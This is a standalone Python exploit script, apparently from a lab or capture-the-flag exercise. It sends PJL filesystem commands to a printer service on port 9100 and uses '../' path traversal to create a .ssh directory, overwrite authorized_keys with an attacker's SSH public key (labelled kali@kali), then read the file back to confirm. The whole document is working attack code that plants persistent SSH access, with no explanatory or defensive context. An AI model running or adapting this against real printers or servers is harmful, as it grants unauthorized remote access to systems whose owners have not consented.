#!/usr/bin/env python3
import socket
import time

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def step_write():
    s = socket.socket()
    s.settimeout(12)
    s.connect(("127.0.0.1", 9100))
    s.sendall(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
    print("mkdir", s.recv(256))
    s.sendall(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())
    print("del", s.recv(256))
    s.sendall(f'@PJL FSAPPEND NAME="{PATH}"\r\n'.encode())
    print("name", s.recv(256))
    s.sendall(f"SIZE={N}\r\n".encode())
    print("size", s.recv(256))
    s.sendall(KEY)
    try:
        print("body", s.recv(256))
    except socket.timeout:
        print("body T")
    s.close()


def step_read_auth():
    s = socket.socket()
    s.settimeout(12)
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL FSUPLOAD NAME="{PATH}"\r\n'.encode())
    print("rname", s.recv(256))
    s.sendall(b"OFFSET=0\r\n")
    print("roff", s.recv(256))
    s.sendall(f"SIZE={N}\r\n".encode())
    print("rsize", s.recv(256))
    try:
        data = s.recv(512)
        print("rdata", repr(data))
    except socket.timeout:
        print("rdata T")
    s.close()


def query():
    s = socket.socket()
    s.settimeout(5)
    s.connect(("127.0.0.1", 9100))
    s.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
    print("Q", s.recv(1024))
    s.close()


step_write()
time.sleep(1)
query()
step_read_auth()